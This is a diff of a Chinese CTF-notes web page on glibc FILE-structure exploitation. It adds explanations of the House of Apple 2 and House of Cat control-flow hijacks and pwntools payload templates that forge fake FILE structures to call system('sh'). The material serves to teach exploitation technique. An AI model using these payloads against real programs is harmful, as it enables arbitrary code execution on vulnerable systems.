@@ -3026,9 +3026,18 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
+  <a href="#house-of-apple-2" class="md-nav__link">
     <span class="md-ellipsis">
-      控制流劫持
+      控制流劫持（House of Apple 2）
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#house-of-cat" class="md-nav__link">
+    <span class="md-ellipsis">
+      控制流劫持（House of Cat）
     </span>
   </a>
   
@@ -3040,7 +3049,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
+  <a href="#_3" class="md-nav__link">
     <span class="md-ellipsis">
       参考
     </span>
@@ -4257,7 +4266,7 @@
 </span><span id="__span-18-72"><a id="__codelineno-18-72" name="__codelineno-18-72" href="#__codelineno-18-72"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span><span id="__span-18-73"><a id="__codelineno-18-73" name="__codelineno-18-73" href="#__codelineno-18-73"></a><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
 </span></code></pre></div>
-<h3 id="_3">控制流劫持</h3>
+<h3 id="house-of-apple-2">控制流劫持（House of Apple 2）</h3>
 <p>前面提到，libc 在结束进程前，会遍历 <code>_IO_list_all</code> 链表，每个 FILE 的缓冲区是否还有内容：如果检查 <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 或者 <code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code> 成立，就说明还有数据没有通过 write syscall 写出去，这时候就会调用 overflow hook 函数来做这件事情。overflow hook 本身保存在 vtable 中，而 vtable 受到了保护，在 <code>IO_validate_vtable</code> 函数中检查它是否合法，即是否为 glibc 自带的 vtable，此时如果用自己构造的 vtable，就会出现 <code>Fatal error: glibc detected an invalid stdio handle</code> 错误。</p>
 <p>虽然不能用 glibc 以外的 vtable，但这时候可以利用 glibc 自带的另一个 vtable：<code>IO_wfile_jumps</code>，它的 <code>overflow</code> 函数指向了 <code>_IO_wfile_overflow</code>：</p>
 <div class="language-c highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_jump_t</span><span class="w"> </span><span class="n">_IO_wfile_jumps</span><span class="w"> </span><span class="n">libio_vtable</span><span class="w"> </span><span class="o">=</span>
@@ -4473,11 +4482,157 @@
 </span><span id="__span-23-163"><a id="__codelineno-23-163" name="__codelineno-23-163" href="#__codelineno-23-163"></a><span class="p">}</span>
 </span></code></pre></div>
 <p>注：从 glibc 2.38 开始，由于 <a href="https://github.com/bminor/glibc/commit/af130d27099651e0d27b2cf2cfb44dafd6fe8a26">Always do locking when accessing streams (bug 15142, bug 14697)</a> 的改动，<code>_IO_cleanup</code> 会去获取 FILE 结构的锁，此时它的 <code>_lock</code> 字段需要指向一个合法的 <code>_IO_lock_t</code> 结构体，此时可以复用 stdin/stdout/stderr 已有的锁：<code>_IO_stdfile_{0,1,2}_lock</code>。</p>
-<h2 id="_4">参考</h2>
+<p>小结：</p>
+<p>House of Apple 2 的原理：</p>
+<ol>
+<li><code>_IO_cleanup</code> 调用 <code>_IO_flush_all_lockp</code></li>
+<li><code>_IO_flush_all_lockp</code> 调用 <code>_IO_OVERFLOW</code></li>
+<li>通过设置 <code>fake_file-&gt;vtable</code> 为 <code>_IO_wfile_jumps</code>，使得 <code>_IO_OVERFLOW</code> 实际上调用的是 <code>_IO_wfile_overflow</code></li>
+<li><code>_IO_wfile_overflow</code> 调用 <code>_IO_WDOALLOCATE</code></li>
+<li>通过设置 <code>fake_file-&gt;file._wide_data-&gt;_wide_vtable-&gt;__doallocate</code> 为 <code>system</code>，使得 <code>__IO_WDOALLOCATE</code> 实际上调用的是 <code>system</code></li>
+</ol>
+<p>pwntools 模板：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># version 1</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>    <span class="p">{</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>        <span class="c1"># fake_file-&gt;file._flags</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>        <span class="c1"># requirements:</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>        <span class="c1"># (_flags &amp; 0x0002) == 0</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>        <span class="c1"># (_flags &amp; 0x0008) == 0</span>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>        <span class="c1"># (_flags &amp; 0x0800) == 0</span>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>        <span class="c1"># with spaces:</span>
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>        <span class="c1"># &quot; sh\x00&quot;</span>
+</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>        <span class="c1"># 0x20, 0x73, 0x68, 0x00</span>
+</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>        <span class="c1"># 0x00: b&quot; sh\x00&quot;,</span>
+</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>        <span class="c1"># without spaces:</span>
+</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>        <span class="c1"># 0x61, 0x61, 0x3b, 0x73, 0x68, 0x00</span>
+</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>        <span class="mh">0x00</span><span class="p">:</span> <span class="sa">b</span><span class="s2">&quot;aa;sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">,</span>
+</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_IO_write_base</span>
+</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>        <span class="mh">0x18</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>        <span class="c1"># fake_file-&gt;file._IO_write_base</span>
+</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>        <span class="mh">0x20</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>        <span class="c1"># fake_file-&gt;file._IO_write_ptr</span>
+</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>        <span class="mh">0x28</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_IO_buf_base</span>
+</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>        <span class="mh">0x30</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span><span id="__span-24-24"><a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_wide_vtable-&gt;__doallocate</span>
+</span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a>        <span class="mh">0x68</span><span class="p">:</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">],</span>
+</span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a>        <span class="c1"># fake_file-&gt;file._lock</span>
+</span><span id="__span-24-27"><a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>        <span class="mh">0x88</span><span class="p">:</span> <span class="n">libc_unstrip</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;_IO_stdfile_0_lock&quot;</span><span class="p">],</span>
+</span><span id="__span-24-28"><a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a>        <span class="c1"># fake_file-&gt;file._wide_data</span>
+</span><span id="__span-24-29"><a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a>        <span class="mh">0xA0</span><span class="p">:</span> <span class="n">fake_file</span><span class="p">,</span>
+</span><span id="__span-24-30"><a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a>        <span class="c1"># fake_file-&gt;file._mode</span>
+</span><span id="__span-24-31"><a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a>        <span class="mh">0xC0</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span><span id="__span-24-32"><a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>        <span class="c1"># fake_file-&gt;vtable</span>
+</span><span id="__span-24-33"><a id="__codelineno-24-33" name="__codelineno-24-33" href="#__codelineno-24-33"></a>        <span class="mh">0xD8</span><span class="p">:</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;_IO_wfile_jumps&quot;</span><span class="p">],</span>
+</span><span id="__span-24-34"><a id="__codelineno-24-34" name="__codelineno-24-34" href="#__codelineno-24-34"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_wide_vtable</span>
+</span><span id="__span-24-35"><a id="__codelineno-24-35" name="__codelineno-24-35" href="#__codelineno-24-35"></a>        <span class="mh">0xE0</span><span class="p">:</span> <span class="n">fake_file</span><span class="p">,</span>
+</span><span id="__span-24-36"><a id="__codelineno-24-36" name="__codelineno-24-36" href="#__codelineno-24-36"></a>    <span class="p">}</span>
+</span><span id="__span-24-37"><a id="__codelineno-24-37" name="__codelineno-24-37" href="#__codelineno-24-37"></a><span class="p">)</span>
+</span><span id="__span-24-38"><a id="__codelineno-24-38" name="__codelineno-24-38" href="#__codelineno-24-38"></a>
+</span><span id="__span-24-39"><a id="__codelineno-24-39" name="__codelineno-24-39" href="#__codelineno-24-39"></a><span class="c1"># version 2</span>
+</span><span id="__span-24-40"><a id="__codelineno-24-40" name="__codelineno-24-40" href="#__codelineno-24-40"></a><span class="c1"># point fake_file-&gt;vtable to fake_file - 0x10 to avoid overflow</span>
+</span><span id="__span-24-41"><a id="__codelineno-24-41" name="__codelineno-24-41" href="#__codelineno-24-41"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+</span><span id="__span-24-42"><a id="__codelineno-24-42" name="__codelineno-24-42" href="#__codelineno-24-42"></a>    <span class="p">{</span>
+</span><span id="__span-24-43"><a id="__codelineno-24-43" name="__codelineno-24-43" href="#__codelineno-24-43"></a>        <span class="c1"># fake_file-&gt;file._flags</span>
+</span><span id="__span-24-44"><a id="__codelineno-24-44" name="__codelineno-24-44" href="#__codelineno-24-44"></a>        <span class="c1"># requirements:</span>
+</span><span id="__span-24-45"><a id="__codelineno-24-45" name="__codelineno-24-45" href="#__codelineno-24-45"></a>        <span class="c1"># (_flags &amp; 0x0002) == 0</span>
+</span><span id="__span-24-46"><a id="__codelineno-24-46" name="__codelineno-24-46" href="#__codelineno-24-46"></a>        <span class="c1"># (_flags &amp; 0x0008) == 0</span>
+</span><span id="__span-24-47"><a id="__codelineno-24-47" name="__codelineno-24-47" href="#__codelineno-24-47"></a>        <span class="c1"># (_flags &amp; 0x0800) == 0</span>
+</span><span id="__span-24-48"><a id="__codelineno-24-48" name="__codelineno-24-48" href="#__codelineno-24-48"></a>        <span class="c1"># basic approach with spaces:</span>
+</span><span id="__span-24-49"><a id="__codelineno-24-49" name="__codelineno-24-49" href="#__codelineno-24-49"></a>        <span class="c1"># &quot; sh\x00&quot;</span>
+</span><span id="__span-24-50"><a id="__codelineno-24-50" name="__codelineno-24-50" href="#__codelineno-24-50"></a>        <span class="c1"># 0x20, 0x73, 0x68, 0x00</span>
+</span><span id="__span-24-51"><a id="__codelineno-24-51" name="__codelineno-24-51" href="#__codelineno-24-51"></a>        <span class="c1"># 0x00: b&quot; sh\x00&quot;,</span>
+</span><span id="__span-24-52"><a id="__codelineno-24-52" name="__codelineno-24-52" href="#__codelineno-24-52"></a>        <span class="c1"># without spaces:</span>
+</span><span id="__span-24-53"><a id="__codelineno-24-53" name="__codelineno-24-53" href="#__codelineno-24-53"></a>        <span class="c1"># 0x61, 0x61, 0x3b, 0x73, 0x68, 0x00</span>
+</span><span id="__span-24-54"><a id="__codelineno-24-54" name="__codelineno-24-54" href="#__codelineno-24-54"></a>        <span class="mh">0x00</span><span class="p">:</span> <span class="sa">b</span><span class="s2">&quot;aa;sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">,</span>
+</span><span id="__span-24-55"><a id="__codelineno-24-55" name="__codelineno-24-55" href="#__codelineno-24-55"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_IO_write_base</span>
+</span><span id="__span-24-56"><a id="__codelineno-24-56" name="__codelineno-24-56" href="#__codelineno-24-56"></a>        <span class="mh">0x08</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span><span id="__span-24-57"><a id="__codelineno-24-57" name="__codelineno-24-57" href="#__codelineno-24-57"></a>        <span class="c1"># fake_file-&gt;file._IO_write_base</span>
+</span><span id="__span-24-58"><a id="__codelineno-24-58" name="__codelineno-24-58" href="#__codelineno-24-58"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_IO_buf_base</span>
+</span><span id="__span-24-59"><a id="__codelineno-24-59" name="__codelineno-24-59" href="#__codelineno-24-59"></a>        <span class="mh">0x20</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span><span id="__span-24-60"><a id="__codelineno-24-60" name="__codelineno-24-60" href="#__codelineno-24-60"></a>        <span class="c1"># fake_file-&gt;file._IO_write_ptr</span>
+</span><span id="__span-24-61"><a id="__codelineno-24-61" name="__codelineno-24-61" href="#__codelineno-24-61"></a>        <span class="mh">0x28</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+</span><span id="__span-24-62"><a id="__codelineno-24-62" name="__codelineno-24-62" href="#__codelineno-24-62"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_wide_vtable-&gt;__doallocate</span>
+</span><span id="__span-24-63"><a id="__codelineno-24-63" name="__codelineno-24-63" href="#__codelineno-24-63"></a>        <span class="mh">0x68</span><span class="p">:</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">],</span>
+</span><span id="__span-24-64"><a id="__codelineno-24-64" name="__codelineno-24-64" href="#__codelineno-24-64"></a>        <span class="c1"># fake_file-&gt;file._lock</span>
+</span><span id="__span-24-65"><a id="__codelineno-24-65" name="__codelineno-24-65" href="#__codelineno-24-65"></a>        <span class="mh">0x88</span><span class="p">:</span> <span class="n">libc_unstrip</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;_IO_stdfile_0_lock&quot;</span><span class="p">],</span>
+</span><span id="__span-24-66"><a id="__codelineno-24-66" name="__codelineno-24-66" href="#__codelineno-24-66"></a>        <span class="c1"># fake_file-&gt;file._wide_data</span>
+</span><span id="__span-24-67"><a id="__codelineno-24-67" name="__codelineno-24-67" href="#__codelineno-24-67"></a>        <span class="mh">0xA0</span><span class="p">:</span> <span class="n">fake_file</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span>
+</span><span id="__span-24-68"><a id="__codelineno-24-68" name="__codelineno-24-68" href="#__codelineno-24-68"></a>        <span class="c1"># fake_file-&gt;file._mode</span>
+</span><span id="__span-24-69"><a id="__codelineno-24-69" name="__codelineno-24-69" href="#__codelineno-24-69"></a>        <span class="mh">0xC0</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span><span id="__span-24-70"><a id="__codelineno-24-70" name="__codelineno-24-70" href="#__codelineno-24-70"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_wide_vtable</span>
+</span><span id="__span-24-71"><a id="__codelineno-24-71" name="__codelineno-24-71" href="#__codelineno-24-71"></a>        <span class="mh">0xD0</span><span class="p">:</span> <span class="n">fake_file</span><span class="p">,</span>
+</span><span id="__span-24-72"><a id="__codelineno-24-72" name="__codelineno-24-72" href="#__codelineno-24-72"></a>        <span class="c1"># fake_file-&gt;vtable</span>
+</span><span id="__span-24-73"><a id="__codelineno-24-73" name="__codelineno-24-73" href="#__codelineno-24-73"></a>        <span class="mh">0xD8</span><span class="p">:</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;_IO_wfile_jumps&quot;</span><span class="p">],</span>
+</span><span id="__span-24-74"><a id="__codelineno-24-74" name="__codelineno-24-74" href="#__codelineno-24-74"></a>    <span class="p">}</span>
+</span><span id="__span-24-75"><a id="__codelineno-24-75" name="__codelineno-24-75" href="#__codelineno-24-75"></a><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="house-of-cat">控制流劫持（House of Cat）</h3>
+<p>House of Cat 是另一种控制流劫持的方法，它的原理是：</p>
+<ol>
+<li><code>_IO_cleanup</code> 调用 <code>_IO_flush_all_lockp</code></li>
+<li><code>_IO_flush_all_lockp</code> 调用 <code>_IO_OVERFLOW</code></li>
+<li>通过设置 <code>fake_file-&gt;vtable</code> 为 <code>_IO_wfile_jumps + 0x30</code>，使得 <code>_IO_OVERFLOW</code> 实际上调用的是 <code>_IO_wfile_seekoff</code></li>
+<li><code>_IO_wfile_seekoff</code> 调用 <code>_IO_switch_to_wget_mode</code></li>
+<li><code>_IO_switch_to_wget_mode</code> 调用 <code>_IO_WOVERFLOW</code></li>
+<li>通过设置 <code>fake_file-&gt;file._wide_data-&gt;_wide_vtable-&gt;__overflow</code> 为 <code>system</code>，使得 <code>__IO_WOVERFLOW</code> 实际上调用的是 <code>system</code></li>
+</ol>
+<p>House of cat 原版：</p>
 <ul>
+<li>offset 0x00: <code>fake_file-&gt;file._flags = "sh";</code></li>
+<li>offset 0x48: <code>fake_file-&gt;file._wide_data-&gt;_IO_write_base = 0;</code></li>
+<li>offset 0x50: <code>fake_file-&gt;file._wide_data-&gt;_IO_write_ptr = 1;</code></li>
+<li>offset 0x58: <code>fake_file-&gt;file._wide_data-&gt;_wide_vtable-&gt;__overflow = system;</code></li>
+<li>offset 0x88: <code>fake_file-&gt;file._lock = _IO_stdfile_0_lock;</code></li>
+<li>offset 0xa0: <code>fake_file-&gt;file._wide_data = fake_file + 0x30;</code></li>
+<li>offset 0xc0: <code>fake_file-&gt;file._mode = 1;</code></li>
+<li>offset 0xd8: <code>fake_file-&gt;vtable = _IO_wfile_jumps + 0x30;</code></li>
+<li>offset 0x110: <code>fake_file-&gt;file._wide_data-&gt;_wide_vtable = fake_file + 0x40;</code></li>
+</ul>
+<p>避免溢出的版本，把 _wide_data 挪到 fake_file - 0x10：</p>
+<ul>
+<li>offset 0x00: <code>fake_file-&gt;file._flags = "sh";</code></li>
+<li>offset 0x08: <code>fake_file-&gt;file._wide_data-&gt;_IO_write_base = 0;</code></li>
+<li>offset 0x10: <code>fake_file-&gt;file._wide_data-&gt;_IO_write_ptr = 1;</code></li>
+<li>offset 0x58: <code>fake_file-&gt;file._wide_data-&gt;_wide_vtable-&gt;__overflow = system;</code></li>
+<li>offset 0x88: <code>fake_file-&gt;file._lock = _IO_stdfile_0_lock;</code></li>
+<li>offset 0xa0: <code>fake_file-&gt;file._wide_data = fake_file - 0x10;</code></li>
+<li>offset 0xc0: <code>fake_file-&gt;file._mode = 1;</code></li>
+<li>offset 0xd0: <code>fake_file-&gt;file._wide_data-&gt;_wide_vtable = fake_file + 0x40;</code></li>
+<li>offset 0xd8: <code>fake_file-&gt;vtable = _IO_wfile_jumps + 0x30;</code></li>
+</ul>
+<p>Pwntools 模板：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>    <span class="p">{</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>        <span class="c1"># fake_file-&gt;file._flags</span>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>        <span class="mh">0x00</span><span class="p">:</span> <span class="sa">b</span><span class="s2">&quot;sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">,</span>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_IO_write_base</span>
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>        <span class="mh">0x08</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_IO_write_ptr</span>
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>        <span class="mh">0x10</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_wide_vtable-&gt;__overflow</span>
+</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>        <span class="mh">0x58</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]),</span>
+</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>        <span class="c1"># fake_file-&gt;file._lock</span>
+</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>        <span class="mh">0x88</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_unstrip</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;_IO_stdfile_0_lock&quot;</span><span class="p">]),</span>
+</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>        <span class="c1"># fake_file-&gt;file._wide_data</span>
+</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>        <span class="mh">0xA0</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_file</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">),</span>
+</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>        <span class="c1"># fake_file-&gt;file._mode</span>
+</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a>        <span class="mh">0xC0</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>        <span class="c1"># fake_file-&gt;file._wide_data-&gt;_wide_vtable</span>
+</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>        <span class="mh">0xD0</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_file</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">),</span>
+</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>        <span class="c1"># fake_file-&gt;vtable</span>
+</span><span id="__span-25-20"><a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>        <span class="mh">0xD8</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;_IO_wfile_jumps&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">),</span>
+</span><span id="__span-25-21"><a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a>    <span class="p">}</span>
+</span><span id="__span-25-22"><a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a><span class="p">)</span>
+</span></code></pre></div>
+<h2 id="_3">参考</h2>
+<ul>
+<li><a href="https://bbs.kanxue.com/thread-273895.htm">[原创]House of cat 新型 glibc 中 IO 利用手法解析 &amp;&amp; 第六届强网杯 House of cat 详解</a></li>
+<li><a href="https://www.cnblogs.com/Sta8r9/p/17586219.html">house of cat</a></li>
 <li><a href="https://www.anquanke.com/post/id/260614">第七届“湖湘杯”House _OF _Emma | 设计思路与解析</a></li>
 <li><a href="https://rosayxy.github.io/codegate-quals-2025-writeup/">Unexpected heap primitive and unintended solve - codegate quals 2025 writeup</a></li>
-<li><a href="https://bbs.kanxue.com/thread-273832.htm">[原创] House of apple 一种新的 glibc 中 IO 攻击方法 (2)</a></li>
+<li><a href="https://bbs.kanxue.com/thread-273832.htm">[原创] House of apple 一种新的 glibc 中 IO 攻击方法 (2)</a> <a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">同名博客</a></li>
 <li><a href="https://dangokyo.me/2018/01/01/advanced-heap-exploitation-file-stream-oriented-programming/">Advanced Heap Exploitation: File Stream Oriented Programming</a></li>
 <li><a href="https://chovid99.github.io/posts/stack-the-flags-ctf-2022/">STACK the Flags CTF 2022</a></li>
 <li><a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/exploit-in-libc2.24/">glibc 2.24 下 IO_FILE 的利用</a></li>
@@ -4504,7 +4659,7 @@
     <span class="md-icon" title="最后更新">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2025年10月21日 10:12:46 UTC">2025年10月21日</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2025年10月22日 15:08:37 UTC">2025年10月22日</span>
   </span>
 
     
